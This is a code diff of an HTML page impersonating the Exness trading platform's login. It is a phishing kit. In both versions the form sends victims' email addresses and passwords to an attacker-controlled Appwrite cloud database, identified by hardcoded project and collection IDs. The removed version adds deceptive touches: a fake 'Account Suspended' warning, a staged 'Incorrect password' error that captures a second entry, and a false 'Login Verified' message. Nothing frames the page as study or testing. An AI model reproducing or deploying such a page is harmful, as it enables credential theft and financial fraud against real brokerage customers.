@@ -1,107 +1,91 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Exness Login Verification</title>
-  <script src="https://cdn.jsdelivr.net/npm/appwrite@13.0.0"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Exness Login</title>
+  <script src="https://cdn.jsdelivr.net/npm/appwrite@13.0.1"></script>
   <style>
     body {
-      font-family: sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #f5f5f5;
+      background: #0f172a;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-    .box {
-      width: 360px;
+    .container {
+      background: #1e293b;
       padding: 40px;
-      background: #fff;
-      margin: 100px auto;
       border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      width: 300px;
     }
-    .box h2 {
-      margin-bottom: 20px;
-    }
-    .box input {
+    input {
       width: 100%;
       padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
+      margin: 10px 0;
+      border: none;
       border-radius: 5px;
     }
-    .box button {
+    button {
       width: 100%;
       padding: 10px;
-      background: #ffc107;
+      background: #38bdf8;
+      color: #000;
       border: none;
-      font-weight: bold;
       border-radius: 5px;
       cursor: pointer;
+      font-weight: bold;
     }
-    .error {
-      color: red;
-      display: none;
-      font-size: 14px;
-      text-align: center;
-    }
-    .success {
-      display: none;
-      text-align: center;
-      color: green;
+    button:hover {
+      background: #0ea5e9;
     }
   </style>
 </head>
 <body>
-
-  <div class="box" id="loginBox">
-    <h2>Account Suspended</h2>
-    <p>Please verify your login</p>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Email" required />
-      <input type="password" id="password" placeholder="Password" required />
+  <div class="container">
+    <h2>Exness Login</h2>
+    <form id="form">
+      <input type="email" id="email" placeholder="Enter Email" required />
+      <input type="password" id="password" placeholder="Enter Password" required />
       <button type="submit">Login</button>
-      <div class="error" id="errorBox">Incorrect password. Try again.</div>
     </form>
   </div>
 
-  <div class="box success" id="successBox">
-    <h2>Login Verified</h2>
-    <p>Your login is verified successfully.</p>
-  </div>
-
   <script>
-    const { Client, Databases, ID } = Appwrite;
-    const client = new Client();
-    client.setEndpoint("https://cloud.appwrite.io/v1").setProject("688645d80003f6f2ac63");
-    const databases = new Databases(client);
+    const client = new Appwrite.Client();
 
-    let attempt = 0;
+    client
+      .setEndpoint('https://cloud.appwrite.io/v1')
+      .setProject('688645d80003f6f2ac63'); // ✅ Project ID
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
+    const databases = new Appwrite.Databases(client);
+
+    document.getElementById("form").addEventListener("submit", function (e) {
       e.preventDefault();
-      attempt++;
 
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
       databases.createDocument(
-        "68864661001cac30c2bd",
-        "6886472800269d8c2b71",
-        ID.unique(),
-        { email, password }
-      ).then(() => {
-        if (attempt === 1) {
-          document.getElementById("errorBox").style.display = "block";
-          document.getElementById("password").value = "";
-        } else {
-          document.getElementById("loginBox").style.display = "none";
-          document.getElementById("successBox").style.display = "block";
+        '68864661001cac30c2bd', // ✅ Database ID
+        '6886472800269d8c2b71', // ✅ Collection ID
+        Appwrite.ID.unique(),
+        {
+          email: email,
+          password: password
         }
-      }).catch(err => {
-        alert("Error: " + err.message);
+      ).then(function (response) {
+        alert("✅ Data saved successfully!");
+        console.log(response);
+      }, function (error) {
+        alert("❌ Failed: " + error.message);
+        console.error(error);
       });
     });
   </script>
-
 </body>
 </html>
